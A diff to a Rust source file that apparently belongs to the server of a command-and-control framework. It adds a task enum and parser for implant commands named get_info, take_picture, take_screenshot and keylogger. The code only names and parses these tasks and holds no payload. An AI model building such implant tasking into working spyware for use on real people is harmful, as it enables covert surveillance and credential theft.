@@ -2,9 +2,32 @@ use crate::schema::*;
 use chrono;
 use diesel::{Associations, Identifiable, Insertable, Queryable};
 use serde::{Deserialize, Serialize};
+use std::str::FromStr;
 use uuid;
 
 use crate::models::implant::Implant;
+
+#[derive(Debug, PartialEq)]
+pub enum Tasks {
+    GetInfo,
+    TakePicture,
+    TakeScreenshot,
+    Keylogger,
+}
+
+impl FromStr for Tasks {
+    type Err = ();
+
+    fn from_str(input: &str) -> Result<Self, Self::Err> {
+        match input {
+            "get_info" => Ok(Tasks::GetInfo),
+            "take_picture" => Ok(Tasks::TakePicture),
+            "take_screenshot" => Ok(Tasks::TakeScreenshot),
+            "keylogger" => Ok(Tasks::Keylogger),
+            _ => Err(()),
+        }
+    }
+}
 
 #[derive(Debug, Identifiable, Associations, Serialize, Deserialize, Insertable, Queryable)]
 #[primary_key(task_id)]
@@ -42,7 +65,7 @@ pub struct AddTaskRequest {
     pub task: String,
 }
 
-#[derive(Serialize)]
+#[derive(Debug, Serialize)]
 pub struct ResponseTask {
     pub task_id: uuid::Uuid,
     pub task: String,
